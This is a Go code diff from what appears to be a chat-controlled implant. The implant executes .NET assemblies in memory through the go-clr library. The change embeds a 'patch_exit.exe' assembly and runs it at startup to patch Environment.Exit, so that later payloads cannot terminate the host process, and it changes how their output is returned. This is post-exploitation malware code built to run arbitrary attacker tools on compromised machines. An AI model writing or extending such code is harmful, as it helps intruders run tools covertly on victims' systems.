@@ -1,6 +1,7 @@
 package main
 
 import (
+	_ "embed"
 	"sync"
 	"crypto/sha256"
 	clr "github.com/Ne0nd0g/go-clr"
@@ -10,6 +11,9 @@ var (
 	clrInstance *CLRInstance
 	assemblies  []*assembly
 )
+
+//go:embed patch_exit.exe
+var patchExitAssembly []byte
 
 type assembly struct {
 	methodInfo *clr.MethodInfo
@@ -63,7 +67,7 @@ func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime s
 	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
 	responseStr := ""
 	if len(stdout) > 0 {
-		responseStr += "Stdout:\n" + stdout
+		responseStr += stdout
 	}
 	if len(stderr) > 0 {
 		responseStr += "Stderr:\n" + stderr
@@ -93,4 +97,6 @@ func getAssembly(data []byte) *assembly {
 func init() {
 	clrInstance = &CLRInstance{}
 	assemblies = make([]*assembly, 0)
+	// Patch Environment.Exit
+	executeAssembly(0, patchExitAssembly, []string{}, "")
 }
